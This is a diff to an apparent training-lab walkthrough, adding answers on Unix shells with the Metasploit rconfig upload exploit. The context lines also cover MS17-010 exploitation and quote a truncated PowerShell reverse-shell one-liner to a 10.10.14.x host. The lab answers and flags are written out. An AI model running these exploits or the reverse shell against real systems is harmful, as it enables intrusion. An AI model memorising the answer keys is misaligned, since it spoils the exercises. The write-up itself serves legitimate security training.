@@ -137,3 +137,16 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.
 
     First we can enumerate using metasploit with `auxiliary/scanner/smb/smb_ms17_010`. Based on the result, we can see its vuln to `MS17-010`. Then we use module `exploit/windows/smb/ms17_010_psexec`. We need to set the RHOSTS and LHOST. After run that, we get the meterpreter session, just type `shell` to get the shell. We can get the flag after that. The answer is `EB-Still-W0rk$`.
 
+## Unix Shells
+### Challenges
+1. What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
+
+    We can find this answer when we execute the modules.
+    
+    ![alt text](assets/unixShells1.png)
+
+    The answer is `php`.
+
+2. Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
+
+    We can use module `rconfig_vendors_auth_file_upload_rce`. Then set the RHOSTS and LHOST. After that we can get the answer from there. The answer is `edgerouter-isp`.
